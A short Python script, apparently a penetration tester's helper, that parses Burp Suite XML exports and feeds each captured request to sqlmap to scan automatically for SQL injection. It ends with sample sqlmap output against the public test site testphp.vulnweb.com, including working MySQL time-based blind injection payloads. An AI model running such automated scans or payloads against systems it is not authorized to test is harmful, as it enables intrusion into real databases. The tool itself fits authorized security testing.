import xml.etree.ElementTree as ET
import subprocess
import re
import random
from datetime import date
import argparse
from art import text2art

def burp(filename):
    outputfile = date.today().strftime('%Y-%m-%d')+generate_random_characters(5)+'sqlmap.txt'
    tree = ET.parse(filename)
    root = tree.getroot()
    for item in root.findall('.//item'):
        request = item.find('.//request').text.strip()
        protocol = item.find('.//protocol').text.strip()
        # with open("log.txt", 'a') as log:
        #     log.write("请求：\n")
        #     log.write(request)
        if '.js' in re.findall(r' (.*?) HTTP/',request)[0]:
            pass
        else:
            print("扫描地址：" + re.findall(r'Host: (.*?)\n', request)[0] + re.findall(r' (.*?) HTTP/', request)[
                0] + '    ' + re.search("^....", request).group())
            if protocol == 'https':
                print("检测到使用https添加--force-ssl")
                file(request, outputfile,ssl='--force-ssl')
            else:
                print("使用http，不添加--force-ssl")
                file(request, outputfile,ssl="")

def file(data,file,ssl):
    with open('request.txt', 'w') as f:
        f.write(data)
    sqlmap('request.txt',file,ssl)

def generate_random_characters(length):
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choices(chars, k=length))

def sqlmap(filename,outputfile,ssl=""):
    #配置sqlmap路径和参数
    p = subprocess.Popen(
        ['python', '/sqlmapproject-sqlmap-6ae0d0f/sqlmap.py', '-r', filename,
         '--batch','--random-agent',ssl],stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, errors = p.communicate()
    # with open("log.txt",'a') as log:
    #     log.write("sqlmap输出：\n")
    #     log.write(output.decode())
    if "Payload:" in output.decode():
        print("发现SQL注入漏洞")
        with open(filename,'r') as file:
            request = file.read()
            file.close()
        matches = re.findall(r'---(.*?)---',output.decode(),re.DOTALL)
        for match in matches:
            print(match.strip())
            with open(outputfile, 'a') as f:
                f.write("漏洞请求：\n"+request+"\n")
                f.write("漏洞payload：\n"+match.strip()+'\n')
                f.close()
    else:
        print("未发现漏洞")
if __name__ == '__main__':
    banner_text = text2art("0X00001sec")
    print(banner_text)
    print("                                          --by purple-WL\n")
    print("脚本说明：sqlmap轮子对burp suite的target结果进行扫描")
    parser = argparse.ArgumentParser(description="参数信息")
    parser.add_argument("-f", "--file", help="指定文件路径", required=True)
    args = parser.parse_args()
    file_path = args.file
    burp(file_path)
    print("卧槽～扫描结束")

'''
[10:32:03] [INFO] testing connection to the target URL
[10:32:04] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: searchFor (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchFor=' AND (SELECT 5184 FROM (SELECT(SLEEP(5)))qrbC) AND 'xBPB'='xBPB&goButton=go
---
[10:32:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.0.12
[10:32:04] [INFO] fetched data logged to text files under '/.local/share/sqlmap/output/testphp.vulnweb.com'

POST parameter 'searchFor' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 81 HTTP(s) requests:
---
Parameter: searchFor (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchFor=1' AND (SELECT 5974 FROM (SELECT(SLEEP(5)))hhlv) AND 'zxgp'='zxgp&goButton=go
---
[10:41:58] [INFO] the back-end DBMS is MySQL
[10:41:58] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.0.12
[10:41:59] [INFO] fetched data logged to text files under '/.local/share/sqlmap/output/testphp.vulnweb.com'
'''

